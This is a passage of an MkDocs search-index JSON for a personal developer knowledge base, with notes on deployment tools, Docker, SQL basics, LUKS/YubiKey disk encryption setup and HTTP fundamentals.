{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":""},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"#documentation","title":"Documentation","text":"<ul> <li>mkdocs</li> <li>Material for MkDocs<ul> <li>Getting started</li> <li>Setup</li> <li>Reference</li> <li>PyMdown Extensions(built-in into Material for MkDocs)</li> </ul> </li> <li> <p>Plugins:</p> <ul> <li>List of plugins from official mkdocs github repo</li> <li>The best MkDocs plugins and customizations(medium)</li> <li>mkdocs-awesome-pages-plugin</li> <li>mkdocs-exclude</li> <li>mkdocs-video</li> <li>mkdocs-macros-plugin</li> </ul> </li> <li> <p>Style:</p> <ul> <li> <p>Code syntax highlight:</p> <ol> <li>Code blocks: Custom syntax theme(docs)</li> <li>Source style sheet(_colors.scss)</li> <li>Syntax theme definition(_highlight.scss)</li> </ol> </li> <li> <p>Icons + Emojis Search</p> <ul> <li> - <code>:fontawesome-brands-youtube:</code></li> <li> - <code>:material-thumb-up:</code></li> <li> - <code>:material-thumb-down:</code></li> <li> - <code>:fontawesome-solid-file-excel:</code></li> <li> - <code>:fontawesome-regular-file-excel:</code></li> <li> - <code>:fontawesome-solid-file-word:</code></li> <li> - <code>:fontawesome-regular-file-word:</code></li> <li> - <code>:fontawesome-solid-file-powerpoint:</code></li> <li> - <code>:fontawesome-regular-file-powerpoint:</code></li> <li> - <code>:material-web:</code></li> <li> - <code>:octicons-logo-github-16:</code></li> <li> - <code>:octicons-mark-github-16:</code></li> <li> - <code>:fontawesome-brands-github:</code></li> <li> - <code>:material-github:</code></li> <li> - <code>:material-arch:</code></li> <li> - <code>:simple-mdnwebdocs:</code></li> <li> - <code>:fontawesome-brands-medium:</code></li> <li> - <code>:simple-medium:</code></li> <li> - <code>:simple-digitalocean:</code></li> <li> - <code>:fontawesome-brands-digital-ocean:</code></li> <li> - <code>:material-digital-ocean:</code></li> </ul> </li> </ul> </li> <li> <p>Personal customization to implement in the future:</p> <ul> <li>medium-zoom, medium-zoom docsify plugin</li> </ul> </li> <li> <p>How To:</p> <ul> <li> <p>Embed image with captions</p> <pre><code>&lt;figure markdown&gt;\n  ![Javascript Engine](image-file){: .zoom}\n  &lt;figcaption&gt;\n      &lt;a href=\"image-source-link\" target=\"_blank\"&gt;image-caption(e.g. image-source-description)&lt;/a&gt;\n  &lt;/figcaption&gt;\n&lt;/figure&gt;\n</code></pre> </li> <li> <p>Embed video: MkDocs Video plugin, 1, 2</p> </li> <li> <p>Embed YouTube Video List</p> <p>copy initial embed code from the YouTube and then set <code>width=\"400vw\" height=\"225vw\"</code></p> <pre><code>&lt;iframe width=\"400vw\" height=\"225vw\" src=\"https://www.youtube.com/embed/gb7gMluAeao?list=PLcvhF2Wqh7DNVy1OCUpG3i5lyxyBWhGZ8\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen&gt;&lt;/iframe&gt;\n</code></pre> </li> <li> <p>Embed pdf:</p> <ol> <li> <p>Embedding a PDF file</p> <pre><code>&lt;object data=\"../foo.pdf\" type=\"application/pdf\" class=\"pdf\"&gt;&lt;/object&gt;\n</code></pre> </li> <li> <p>Creating a link to a PDF file</p> <pre><code>&lt;a href=\"../foo.pdf\" class=\"image fit\" style=\"color: red\"&gt;:fontawesome-regular-file-pdf:&lt;/a&gt;\n</code></pre> <p>or</p> <pre><code>&lt;a href=\"../foo.pdf\" class=\"image fit\" style=\"color: red\"&gt;:fontawesome-solid-file-pdf:&lt;/a&gt;\n</code></pre> </li> <li> <p>docsify-pdf-embed.js</p> </li> </ol> </li> </ul> </li> </ul>"},{"location":"Dev/Blockchain/","title":"Blockchain","text":""},{"location":"Dev/Cicd/","title":"CI/CD","text":""},{"location":"Dev/Cicd/#tools","title":"Tools","text":""},{"location":"Dev/Cicd/#cicd-tools","title":"CI/CD tools","text":""},{"location":"Dev/Cicd/#github-actions","title":"GitHub Actions","text":"<p>Automate, customize, and execute your software development workflows right in your repository with GitHub Actions. You can discover, create, and share actions to perform any job you'd like, including CI/CD, and combine actions in a completely customized workflow.</p> <p>GitHub Actions Docs</p>"},{"location":"Dev/Cicd/#deployment-tools","title":"Deployment tools","text":""},{"location":"Dev/Cicd/#flyio","title":"Fly.io","text":"<p>For many languages and frameworks, you can deploy your app from zero, with the following three steps.</p> <ol> <li>Install <code>flyctl</code> - you'll need it.</li> <li>Create an account with <code>fly auth signup</code> or login with <code>fly auth login</code>.</li> <li>Run <code>fly launch</code> - create, configure, and deploy a new application.</li> </ol>"},{"location":"Dev/Cicd/#railway","title":"Railway","text":"<p>Made for any language, for projects big and small. Railway is the cloud that takes the complexity out of shipping software.</p>"},{"location":"Dev/Cicd/#herokupaid","title":"Heroku(paid)","text":"How to"},{"location":"Dev/Cicd/#heroku-cli-commands","title":"Heroku CLI commands","text":"<pre><code># create an app in heroku server, with url\nheroku create\n\n#  deploy the app\ngit push heroku master\n\n# login to new app\nheroku login # being in the projects' root path\n\n#  open app on browser\nheroku open\n\n#  print log\nheroku logs --tail\n\n#  check whether database is installed\nheroku addons\n\n#  connect and enter to psql cli\nheroku pg:psql\n\n# get database info, url\nheroku pg:info\nheroku config\n</code></pre>"},{"location":"Dev/Cicd/#frontend","title":"Frontend","text":"<p>Deploying Production Build of React App to Heroku </p>"},{"location":"Dev/Cicd/#backend","title":"Backend","text":"<p>Getting Started on Heroku with Node.js</p> <p>Deploying with Git</p>"},{"location":"Dev/Cicd/#tutorials","title":"Tutorials","text":""},{"location":"Dev/Cicd/#dockerization","title":"Dockerization","text":""},{"location":"Dev/Cicd/#dockerizing-a-react-app","title":"Dockerizing a react app","text":"<ul> <li> How to Dockerize a React Application [Beginners Guide]</li> <li> Dockerizing a React app, Jun 19, 2022</li> <li> Dockerize your React app, Jul 9, 2021</li> <li> Containerize branches from React Application using ReactBranchContainer, Oct 31, 2020</li> </ul>"},{"location":"Dev/Cicd/#react-in-docker-with-nginx-built-with-multi-stage-docker-builds-including-testing","title":"React in Docker with Nginx, built with multi-stage Docker builds, including testing","text":""},{"location":"Dev/Cicd/#https-using-nginx-and-lets-encrypt-in-docker","title":"HTTPS using Nginx and Let's encrypt in Docker","text":""},{"location":"Dev/Cicd/#-docker-compose-nginx-mysql-php-fpm-wordpress","title":"\u0412\u0435\u0431-\u0441\u0435\u0440\u0432\u0435\u0440 \u043d\u0430 \u0440\u0435\u0430\u043b\u044c\u043d\u043e\u043c \u043f\u0440\u0438\u043c\u0435\u0440\u0435. Docker-compose, nginx, mysql, php-fpm, wordpress","text":"<p>\u0412 \u0432\u0438\u0434\u0435\u043e \u043d\u0430\u0441\u0442\u0440\u0430\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0441\u0432\u044f\u0437\u043a\u0430 Docker-compose, nginx, mysql, php-fpm, wordpress</p>"},{"location":"Dev/Cicd/#https-nginx-docker-ssl-lets-encrypt","title":"HTTPS + NGINX + DOCKER. \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043c \u0431\u0435\u0441\u043f\u043b\u0430\u0442\u043d\u044b\u0439 ssl \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442 \u043e\u0442 Let's Encrypt","text":"<p>\u0412 \u0432\u0438\u0434\u0435\u043e \u043d\u0430\u0441\u0442\u0440\u0430\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0441\u0432\u044f\u0437\u043a\u0430 Docker-compose, nginx, mysql, php-fpm, wordpress, cerbot</p>"},{"location":"Dev/Cicd/#integration","title":"Integration","text":""},{"location":"Dev/Cicd/#continuous-deployment-using-docker-github-actions-and-web-hooks-mar-1-2020","title":"Continuous deployment using Docker, GitHub Actions, and Web-hooks, Mar 1, 2020","text":""},{"location":"Dev/Cicd/#using-github-actions-to-deploy-a-react-app-and-express-api-over-ssh-in-15-seconds","title":"Using Github Actions to Deploy a React App and Express API Over SSH in 15 seconds","text":""},{"location":"Dev/Cicd/#deployment","title":"Deployment","text":""},{"location":"Dev/Cicd/#kb-tpl-docker-compose-pern-app-deploy","title":"kb-tpl-docker-compose-pern-app-deploy","text":"<p>My tutorial mainly based on CI/CD design from \"Deploying a Web App with Docker &amp; GitHub Actions | Part 1  | Part 2 \"</p> <p>Utilized: Github Actions, Build and push Docker images , Watchtower</p>"},{"location":"Dev/Cicd/#wordpress-on-docker-with-nginx-traefik-le-ssl-security-and-speed","title":"WordPress on Docker with Nginx, Traefik, LE SSL, Security, and Speed","text":""},{"location":"Dev/Cicd/#hosting-multiple-full-stack-web-apps-on-a-single-vps-using-nginx-and-docker","title":"Hosting Multiple Full Stack Web Apps on a single VPS using Nginx and Docker","text":""},{"location":"Dev/Cloud/Aws/","title":"AWS","text":""},{"location":"Dev/Cloud/Nextcloud/","title":"Nextcloud","text":"<ul> <li>Nextcloud docs - Admin manual</li> <li>Nextcloud docs - User manual</li> <li>Nextcloud docs - Developer manual</li> </ul>"},{"location":"Dev/Cloud/Nextcloud/#tutorials","title":"Tutorials","text":""},{"location":"Dev/Cloud/Nextcloud/#kb-tpl-docker-nextcloud","title":"kb-tpl-docker-nextcloud","text":""},{"location":"Dev/Cloud/Nextcloud/#isp-mail-tutorial","title":"ISP Mail Tutorial","text":""},{"location":"Dev/Cloud/Vps/","title":"VPS","text":""},{"location":"Dev/Containerization/","title":"Containerization","text":""},{"location":"Dev/Containerization/#docker","title":"Docker","text":"<ul> <li>Docker Docs</li> <li>Docker Docs - Dockerfile reference</li> <li>Docker Docs - Compose reference</li> <li>Docker Docs - Multi-stage builds</li> </ul>"},{"location":"Dev/Containerization/#watchtower","title":"Watchtower","text":"<ul> <li>Watchtower Docs</li> <li>How to Automatically Update Docker Container Images with Watchtower on Ubuntu 22.04</li> </ul>"},{"location":"Dev/Cs/","title":"Computer Science","text":""},{"location":"Dev/Db/","title":"Data Bases","text":""},{"location":"Dev/Db/#db-learning-sources","title":"Db Learning Sources","text":"<p>Khan Academy</p> <p>Codecademy</p>"},{"location":"Dev/Db/#data-base-migration-event-sourcing-concept","title":"Data Base migration, Event Sourcing concept","text":"<p>Database Migration: Knex vs TypeORM vs Sequelize(part 1)</p> <p>Database Migration: Knex vs TypeORM vs Sequelize(part 2)</p>"},{"location":"Dev/Db/#db-essentials","title":"Db Essentials","text":"<p>DBMS - a collection of tools to delete,insert and lookup data(and mamy other actions). Thera are two types:</p> <ol> <li>Relational Database: postgreSQL, oracle, sql etc.</li> <li>schema: the relation between tables</li> <li>structure: data stored in many tables with specific information, e.g. a table that stores users' emails, a table that stores users' addresses etc.</li> <li> <p>communication via: SQL</p> </li> <li> <p>Non-relational Database(NoSQL): mongoDB etc.</p> </li> <li>schema: not needed, so it's more flexible</li> <li>structure: all data stored in one json file, e.g. each user has a file with username, address etc.</li> <li>communication via:<ul> <li>db query languages, e.g. mongoDB query language</li> <li>Object Data Modeling (ODM) library, e.g. Mongoose</li> </ul> </li> </ol>"},{"location":"Dev/Db/#sql","title":"SQL","text":"<pre><code>-- BASICS:\n\n-- create table\nCREATE TABLE nameofTable (\nid serial NOT NULL PRIMARY KEY -- auto increase for us when insert, don't need to specify on insert\ncolumnName dataType NOT NULL,\ncolumnName dataType UNIQUE\n);\n\n-- insert table\nINSERT INTO nameofTable(columnName1,columnName2) VALUES (value1, value2);\n\n-- add column\nALTER TABLE nameofTable ADD columnName\n\n-- add value in column\nUPDATE nameofTable SET columnName = 10 WHERE columnName = 'aa'\n\n-- get info\nSELECT columnName FROM nameofTable\n-- same here using `*` (represents 'all')\nSELECT * FROM nameofTable\n\n\n-- CONDITIONAL SELECTION:\n\n-- select name begin with A\nSELECT * FROM users WHERE name LIKE 'A%';\n\n-- ending with y\nSELECT * FROM users WHERE name LIKE '%y';\n\n-- order the column\nSELECT * FROM users ORDER BY score ASC;\nSELECT * FROM users ORDER BY score DESC;\n\n\n-- FUNCTIONS:\n\n-- most common\nSELECT AVG(score) FROM users;\nSELECT SUM(score) FROM users;\nSELECT COUNT(name) FROM users;\n\n-- JOIN\nSELECT * FROM users JOIN login ON users.name = login.name;\n\n-- DELETION:\n\n-- delete row\nDELETE FROM users WHERE name='Sally';\n\n-- delete table\nDROP TABLE users;\n</code></pre>"},{"location":"Dev/Db/#installation-guides","title":"Installation Guides","text":""},{"location":"Dev/Db/#linuxi-mint","title":"Linuxi Mint","text":"<p>See <code>psql+instalation.docx</code> or <code>psql+instalation.pdf</code> files in this doc folder.  TODO: Transform <code>psql+instalation.docx</code> to .md format for this section.</p>"},{"location":"Dev/Db/#gui-dbms-clients","title":"GUI dbms clients","text":""},{"location":"Dev/Db/#free","title":"Free","text":"<ul> <li>DBeaver - Free multi-platform database tool for developers, database administrators, analysts and all people who need to work with databases.</li> </ul> <p>Supports: MySQL, PostgreSQL, SQLite, Oracle, DB2, SQL Server, Sybase, MS Access, Teradata, Firebird, Apache Hive, Phoenix, Presto, etc.</p> <ul> <li>Beekeeper Studio - Open source sql editor and database manager.</li> </ul> <p>Supports:  MySQL, Postgres, SQLite, SQL Server, MariaDB, etc.</p>"},{"location":"Dev/Db/#paid","title":"Paid","text":""},{"location":"Dev/Hardware/Easy2Boot%28OSes%20Installatiion%29/","title":"Easy2Boot - OSes Installation","text":"<p>The free USB multiboot solution for professionals. Copy all ISO files to your USB drive and then Legacy or UEFI boot!</p> <p>E2B \u2013 Main page</p> <p>E2B Downloads</p> <p>E2B Downloads - Latest Betas with bugfixes</p>"},{"location":"Dev/Hardware/Easy2Boot%28OSes%20Installatiion%29/#how-to-update-e2b","title":"How to update E2B","text":"<p>Simply extract the files from the E2B download and copy them to your E2B USB drive to update the E2B version, e.g.:</p> <pre><code>rsync -auv --preallocate ~/dl/Easy2Boot_v2.13_password_is_e2b/ /run/media/$USER/E2B/\n</code></pre>"},{"location":"Dev/Hardware/Easy2Boot%28OSes%20Installatiion%29/#file-not-contiguous-and-too-many-fragments-errors","title":"\u2018File Not Contiguous\u2019 and \u2018Too Many Fragments\u2019 Errors","text":"<p>Most (but not all) E2B payload files need to be contiguous (in sequential sectors/clusters on the disk). If you see this error reported by E2B, then that file may not boot or work correctly! This error most often occurs if you have been deleting and adding several files to the E2B drive and it is very full.</p> <ul> <li> <p>Solution for Linux</p> <p>Run defragmentation perl script for directory in with a \"not contigiuos\" iso is, e.g.:</p> <pre><code>sudo perl /run/media/$USER/E2B/_ISO/docs/linux_utils/defragfs.pl /run/media/$USER/E2B/_ISO/LINUX\n</code></pre> <p>Warning</p> <p>When asked: <code>Please specify the percentage of files should be defrag (1-100) [33.3333333333333] or hit Enter</code>, type 100 and hit Enter</p> </li> <li> <p>Solution Windows</p> <p>Double-click on \\MAKE_THIS_DRIVE_CONTIGUOUS.cmd on the E2B USB drive.</p> </li> </ul>"},{"location":"Dev/Linux/","title":"Linux","text":"<ul> <li>Linux Handbook</li> </ul>"},{"location":"Dev/Linux/#applications","title":"Applications","text":"<ul> <li> The Linux User's Toolkit for Discovering New Apps</li> </ul>"},{"location":"Dev/Linux/#cron","title":"Cron","text":"<p>How to Set Up a Cron Job in Linux</p>"},{"location":"Dev/Linux/#systemd-timer","title":"Systemd timer","text":"<p>CRON.D \u0431\u043e\u043b\u044c\u0448\u0435 \u041d\u0415 \u041d\u0423\u0416\u0415\u041d. \u041a\u0430\u043a \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f SYSTEMD TIMER? , </p>"},{"location":"Dev/Linux/#namespace","title":"Namespace","text":"<ul> <li> \u0423\u0433\u043b\u0443\u0431\u043b\u0435\u043d\u043d\u043e\u0435 \u0437\u043d\u0430\u043a\u043e\u043c\u0441\u0442\u0432\u043e \u0441 \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u0430\u043c\u0438 \u0438\u043c\u0435\u043d Linux. \u0427\u0430\u0441\u0442\u044c 1(Habr)</li> <li> \u0423\u0433\u043b\u0443\u0431\u043b\u0435\u043d\u043d\u043e\u0435 \u0437\u043d\u0430\u043a\u043e\u043c\u0441\u0442\u0432\u043e \u0441 \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u0430\u043c\u0438 \u0438\u043c\u0435\u043d Linux. \u0427\u0430\u0441\u0442\u044c 2(Habr)</li> </ul>"},{"location":"Dev/Linux/#tutorials","title":"Tutorials","text":""},{"location":"Dev/Linux/#os-installation","title":"OS Installation","text":""},{"location":"Dev/Linux/#encrypted-main-partition-with-no-separate-boot-partition","title":"Encrypted main partition with no separate <code>/boot</code> partition","text":"<ol> <li> <p>edit <code>/etc/mkinitcpio.conf</code> and <code>/etc/default/grub</code> as follows:</p> /etc/mkinitcpio.conf<pre><code>.\n.\n.\nFILES=\"/crypto_keyfile.bin\"\n.\n.\n.\n</code></pre> /etc/default/grub<pre><code>.\n.\n.\ncryptdevice=UUID=&lt;main-partition-uuid-found-in-/dev/disk/by-uuid&gt;:luks-&lt;main-partition-uuid-found-in-/dev/disk/by-uuid&gt; root=/dev/mapper/luks-&lt;main-partition-uuid-found-in-/dev/disk/by-uuid&gt; cryptkey=rootfs:/crypto_keyfile.bin loglevel=3 audit=0 nvme_load=yes\"\n.\n.\n.\nGRUB_ENABLE_CRYPTODISK=\"y\"\n.\n.\n.\nGRUB_GFXMODE=\"1920x1080\"\n.\n.\n.\nGRUB_DISABLE_OS_PROBER=\"true\"\n</code></pre> </li> <li> <p>Update changes:</p> <pre><code>sudo mkinitcpio -P\nsudo grub-mkconfig -o /boot/grub/grub.cfg\n</code></pre> </li> </ol>"},{"location":"Dev/Linux/#encrypted-main-partition-with-separate-boot-partition-bootefi-partition","title":"Encrypted main partition with separate  <code>/boot</code> partition + <code>/boot/efi</code> partition","text":""},{"location":"Dev/Linux/#luks-disks-setup","title":"LUKS disks setup","text":"<ul> <li>Detached LUKS header full disk encryption with encrypted keyfile inside a passphrase-protected bootable keydisk using direct UEFI secure boot, encrypted swap, unbound with DNSCrypt and DNSSEC, and system hardening</li> <li>YubiKey Full Disk Encryption</li> </ul>"},{"location":"Dev/Linux/#step-1-creating-keydisks","title":"Step 1 - Creating KeyDisk(s)","text":"<ol> <li> <p>Find out block device mappings and locate the keydisk for setting up.</p> <pre><code>lsblk -o FSAVAIL,FSUSE%,SIZE,VENDOR,MODEL,NAME,UUID,SERIAL\n</code></pre> </li> <li> <p>Shred whole data in the disk.</p> <pre><code>dd if=/dev/urandom of=/dev/mmcblk0 bs=4096\n</code></pre> </li> <li> <p>Prepare the disk: create partitions - use following command and then type in options below.</p> <pre><code>sudo gdisk /dev/mmcblk0\n</code></pre> <p>Note</p> <p><code>n</code> is new partition, <code>L</code> shows all hex codes for filesystems (EF00, 8300), <code>t</code> allows you to change a filesystem after creating a partition</p> <ul> <li><code>n</code> </li> <li><code>1</code> </li> <li><code>2048</code> </li> <li><code>+512M</code> </li> <li><code>EF00</code> </li> <li><code>n</code> </li> <li><code>2</code> </li> <li><code>(Hit enter to accept the automatic start value here)</code> </li> <li><code>(Hit enter to accept the automatic end value here)</code> </li> <li><code>8300</code> </li> <li><code>w</code> - write changes </li> <li><code>q</code> - quit</li> </ul> </li> <li> <p>LUKS encrypt previously created second partition(the bigger one) in conjaction with Yubikey using <code>ykfde</code> tool.</p> <pre><code>sudo ykfde-format --cipher=twofish-xts-plain64 --key-size=512 --hash=sha512 -i 30000 /dev/mmcblk0p2\n</code></pre> <p>Attention</p> <p><code>sudo ykfde-format ...</code> - It will ask for setting up the password, use the one from \"Other: YUBIKEY_YKFDE secret challenge\" entry in KeepassXC db.</p> <p>Note</p> <p>the <code>-i</code> is for iteration time in milliseconds for the key derivation function pbkdf, it should be at least 5000 (5 seconds), but preferably put it as high as you can stand</p> </li> <li> <p>Unlock encripted partition and name it 'cryptboot'. Format it to <code>ext2</code>.</p> <pre><code>keepassxc-cli show -a Password -y 1 --no-password \"&lt;KeepassXC-db-path&gt;\" \"Other: YUBIKEY_YKFDE secret challenge\" | sudo ykfde-open -d /dev/mmcblk0p2 -n cryptboot\nmkfs.ext2 /dev/mapper/cryptboot\n</code></pre> <p>Note</p> <p>ext2 is for simplicity and to avoid journaling since it's just a mmc card(or usb drive)</p> </li> <li> <p>Mount 'cryptboot' to  <code>/mnt</code> and copy all necessary staff from other KeyDisks(or create new ones if needed) and then unmount and lock it.</p> <pre><code>sudo mount /dev/mapper/cryptboot /mnt\n.\n.\n.\n# creation of key.img file for EncDisks(if needed)\ncd /mnt\ndd if=/dev/urandom of=key.img bs=20M count=1\nsudo ykfde-format --align-payload=1 --cipher=serpent-xts-plain64 --key-size=512 --hash=sha512 -i 30000 key.img\n.\n.\n.\nsudo umount /mnt\nudisksctl lock -b /dev/mmcblk0p2\n</code></pre> <p>Attention</p> <p><code>sudo ykfde-format ...</code> - It will ask for setting up the password, use the one from \"Other: YUBIKEY_YKFDE secret challenge\" entry in KeepassXC db.</p> </li> </ol>"},{"location":"Dev/Linux/#step-2-creating-encdisks","title":"Step 2 - Creating EncDisk(s)","text":"<ol> <li> <p>EncDisk --&gt; (optional) Shred whole data in the disk.</p> <pre><code>dd if=/dev/urandom of=/dev/sdX bs=4096\n</code></pre> </li> <li> <p>KeyDisk --&gt; Being in <code>/mnt</code> dir, instead of unmounting 'cryptboot' and locking the <code>/dev/mmcblk0p2</code> in Step 1,p6 unlock <code>/mnt/img.key</code> and mount it as 'lukskey'.</p> <pre><code>keepassxc-cli show -a Password -y 1 --no-password \"&lt;KeepassXC-db-path&gt;\" \"Other: YUBIKEY_YKFDE secret challenge\" | sudo ykfde-open -d /mnt/key.img -n lukskey\n</code></pre> </li> <li> <p>KeyDisk --&gt; Create <code>header.img</code> for the detached LUKS header full disk encryption of the EncDisk.</p> <pre><code>truncate -s 2M header.img\n</code></pre> </li> <li> <p>EncDisk --&gt; Detached LUKS header full disk encrypt the EncDisk.</p> <pre><code>cryptsetup --cipher=serpent-xts-plain64 --key-size=512 --hash=sha512 --key-file=/dev/mapper/lukskey --keyfile-offset=0 --keyfile-size=8192 -i 30000 luksFormat /dev/sdX --align-payload 4096 --header header.img\n</code></pre> </li> <li> <p>EncDisk --&gt; Unlock encripted EncDisk and name it e.g. 'enc'. Format it to <code>ext4</code>.</p> <pre><code>cryptsetup open --header header.img --key-file=/dev/mapper/lukskey --keyfile-offset=0 --keyfile-size=8192 /dev/sdX enc\nmkfs.ext4 /dev/mapper/enc\n</code></pre> </li> <li> <p>Lock back 'enc' and 'lukskey'. Unmount <code>/mnt</code>.</p> <pre><code>cd /\ncryptsetup close enc\ncryptsetup close lukskey\numount /mnt\n</code></pre> <p>Note</p> <p>if it complains about being busy make sure 'lukskey' container is closed then <code>ps -efw</code> to find hanged processes and their PIDs to kill with <code>kill -9 &lt;PID&gt;</code></p> </li> </ol>"},{"location":"Dev/Network/","title":"Network","text":""},{"location":"Dev/Network/#internet","title":"Internet","text":""},{"location":"Dev/Network/#history","title":"History","text":"<ul> <li>Before www, there was internet, computer connect each other, but hard to communicate each other</li> <li>In 1989 www invented by Tim Berners-Lee: a protocol (common language computer can speak)</li> <li>Internet is a phone, www is an application</li> <li>In 1991 first website was created</li> </ul>"},{"location":"Dev/Network/#what-happens-when-you-click-a-website","title":"What happens when you click a website?","text":"<p>Click google \u2b95</p> <p>ISP (internet service provider)  \u2b95</p> <p>DNS (domain name server) like a phone book store the address of google.com IP address  \u2b95</p> <p>send back to browser</p> <p>Browser send IP address \u2b95</p> <p>google servers (like a computer, store file)  \u2b95</p> <p>server send HTML CSS Javascript file to the browser</p> <p>How to transmit data:</p> <p>Router \u2b95 Modem of the house \u2b95 ISP \u2b95internet backbone (physical cable) \u2b95 servers</p> <p>How to make visit website fast:</p> <ul> <li>Location of server (nearer faster)</li> <li>How many trips</li> <li>Size of file</li> </ul>"},{"location":"Dev/Network/#internet-protocols","title":"Internet Protocols","text":""},{"location":"Dev/Network/#http-https","title":"HTTP, HTTPS","text":"<p>Reference: W3S</p> <p>HTTP(Hypertext Transfer Protocol) works as a request-response protocol between a client and server.</p> <p>Example: A client (browser) sends an HTTP request to the server; then the server returns a response to the client.</p> <p>Request consist of:</p> <ul> <li> <p>Headers</p> </li> <li> <p>Body</p> </li> <li> <p>Method</p> <p>Most used methods are:</p> <ul> <li>GET</li> <li>POST(add)</li> <li>PUT(update)</li> <li>DELETE - browser can use query strings (the string after the <code>?</code> of website link in the address bar) or the body to send request</li> </ul> </li> </ul> <p>Response consist of:</p> <ul> <li> <p>Headers</p> </li> <li> <p>Status</p> <p>List of all HTTP Status Messages(W3S)</p> </li> </ul> <p>HTTPS: communication between client(browser) and server is encryted.</p>"},{"location":"Dev/Network/#json-xml","title":"JSON, XML","text":"<p>They are data formats used for communication between client and server when HTTP protocol is used.</p> <p>XML: HTML like syntax.</p> <p>JSON: object like syntax.</p> <pre><code>// JSON object methods in Javascript\nvar obj = JSON.parse({\"name\":\"Bob\",\"age\":29})\nvar myJSON = JSON.stringify(obj)\n</code></pre>"},{"location":"Dev/Network/#ajax","title":"AJAX","text":"<ul> <li>A way browser make request to server.</li> <li>Without AJAX everytime need to update the page, need to refresh the whole page.</li> <li>Now it can only update a small proportion dynamically.</li> </ul> <p>Usage example in Javascript:</p> <ul> <li>Old way: XML HTTP request</li> <li>New: jQuery</li> <li> <p>Newer: <code>fetch('url').then()</code></p> <pre><code>// fetch can have its own json convert\n.then(response =&gt; response.json())\n</code></pre> </li> </ul>"},{"location":"Dev/Network/Nginx/","title":"Nginx","text":""},{"location":"Dev/Network/Traefik/","title":"Traefik","text":"<p>Traefik Docs</p>"},{"location":"Dev/Network/Traefik/#tutorials","title":"Tutorials","text":""},{"location":"Dev/Network/Traefik/#kb-tpl-docker-traefik","title":"kb-tpl-docker-traefik","text":"<p>About ports:</p> <p>We didn't have to tell Traefik to which ports to proxy to, even though our API, for example, uses port 3000. This is because traefik inspect exposed ports of the container (NOT exposed in the service, but exposed using <code>EXPOSE</code> keyword in <code>Dockerfile</code>). If our container didn't have a port exposed or had multiple ports exposed, we would use a label like this to specify the port:</p> docker-compose.yml<pre><code>labels:\n# ...\n- \"traefik.http.services.&lt;service_name&gt;.loadbalancer.server.port=8080\" # 8080 is the port we proxy to\n</code></pre>"},{"location":"Dev/Network/Traefik/#how-to-use-traefik-v2-as-a-reverse-proxy-for-docker-containers-on-ubuntu-2004","title":"How To Use Traefik v2 as a Reverse Proxy for Docker Containers on Ubuntu 20.04","text":""},{"location":"Dev/Network/Traefik/#ultimate-traefik-docker-compose-guide-2022-with-letsencrypt","title":"Ultimate Traefik Docker Compose Guide [2022] with LetsEncrypt ,","text":""},{"location":"Dev/Prg/Concepts/Authentication/","title":"Authentication","text":"<p>Reference:</p> <p>A guide for adding JWT token-based authentication to your single page Node.js applications</p> <p>4 Most Used REST API Authentication Methods</p>"},{"location":"Dev/Prg/Concepts/General-concepts/","title":"General Concepts","text":""},{"location":"Dev/Prg/Concepts/General-concepts/#conventions-and-standards","title":"Conventions and standards","text":""},{"location":"Dev/Prg/Concepts/General-concepts/#3-2-1-data-backup-rule","title":"3-2-1 Data Backup Rule","text":"<ul> <li>3 - at least 3 copies (one primary, two copies)</li> <li>2 - two different technologies (e.g. different filesystem, different software, or different media types)</li> <li>1 - one copy should be off-site/offline</li> </ul>"},{"location":"Dev/Prg/Concepts/General-concepts/#semantic-versioning-aabbcc","title":"Semantic Versioning: aa.bb.cc","text":"<ul> <li>aa - major release, quite different from previous version</li> <li>bb - minor release, add a new feature</li> <li>cc - patch release, a bug fix</li> </ul>"},{"location":"Dev/Prg/Concepts/General-concepts/#the-twelve-factor-appsource","title":"The Twelve Factor App(source)","text":"<ol> <li>Codebase - One codebase tracked in revision control, many deploys</li> <li>Dependencies - Explicitly declare and isolate dependencies</li> <li>Config - Store config in the environment</li> <li>Backing services - Treat backing services as attached resources</li> <li>Build, release, run - Strictly separate build and run stages</li> <li>Processes - Execute the app as one or more stateless processes</li> <li>Port binding - Export services via port binding</li> <li>Concurrency - Scale out via the process model</li> <li>Disposability - Maximize robustness with fast startup and graceful shutdown</li> <li>Dev/prod parity - Keep development, staging, and production as similar as possible</li> <li>Logs - Treat logs as event streams</li> <li>Admin processes - Run admin/management tasks as one-off processes</li> </ol>"},{"location":"Dev/Prg/Concepts/General-concepts/#environment-variables","title":"Environment variables","text":"<p>Linux:</p> <ul> <li>How To Read and Set Environmental and Shell Variables on Linux(Digital Ocean)</li> </ul> <p>Windows:</p> <ul> <li>about_Environment_Variables</li> <li>HowTo: Set an Environment Variable in Windows - Command Line and Registry</li> <li>Set PATH and other environment variables in Windows 10</li> </ul> <ul> <li>Environment is an area that the shell builds every time that it starts a session that contains variables that define system properties.</li> <li>The environment provides a medium through which the shell process can get or set settings and, in turn, pass these on to its child processes. It implemented as strings that represent key-value pairs. If multiple values are passed, they are typically separated by colon(<code>:</code>) characters: <code>KEY=value1:value2:...</code>. If the value contains significant white-space, quotations(as double as single quotes) are used: <code>KEY=\"value with spaces\"</code>, <code>KEY='value with spaces'</code>.</li> <li>An environment variable is a storage location that has a name(key) and a value. The keys in these scenarios are variables. They can be one of two types, environmental variables or shell variables(see below).</li> <li>Benefit to things that should keep secret or need to be dynamic, like API keys, PORT, database url.</li> 